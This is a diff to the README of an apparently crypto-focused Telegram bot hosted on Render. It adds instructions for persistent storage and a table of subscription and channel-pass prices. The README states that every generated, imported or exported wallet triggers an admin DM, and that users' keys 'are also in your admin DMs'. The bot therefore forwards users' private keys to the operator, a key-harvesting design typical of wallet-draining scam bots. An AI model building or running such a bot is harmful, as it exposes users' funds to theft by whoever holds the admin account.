@@ -169,3 +169,30 @@ Admin DM alerts: every payment, every wallet generated/imported/exported
 
 Manual path: *New → Web Service*, Python, build
 `pip install -r requirements.txt`, start `python bot.py`.
+
+## 8. Persistence on Render (keep wallets across restarts)
+
+Free Render instances have an **ephemeral disk** — `runner.db` is wiped on
+every deploy/restart, which is why users would see the wallet prompt again.
+Two options:
+
+1. **Attach a persistent disk** (Render → your service → Disks → Add):
+   mount path `/var/data`, then set env var `DATA_DIR=/var/data` and redeploy.
+   The DB (users, wallets, subscriptions) survives every restart.
+2. Without a disk: the bot works fine within one deploy, and users can
+   re-import their wallets after redeploys (keys are also in your admin DMs).
+
+## 9. Prices — change anytime in `.env`
+
+```env
+NEWBIE_PRICE=1      NEWBIE_DAYS=30
+BEGINNER_PRICE=2    BEGINNER_DAYS=30
+PRO_PRICE=4         PRO_DAYS=30
+ELITE_PRICE=8       ELITE_DAYS=60
+INSIDER_PRICE=5     INSIDER_DAYS=30
+BOT_MONTH_NAME=Monthly Access
+BOT_MONTH_PRICE=2   BOT_MONTH_DAYS=30
+CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45
+```
+
+Restart after changing. No code edits needed.
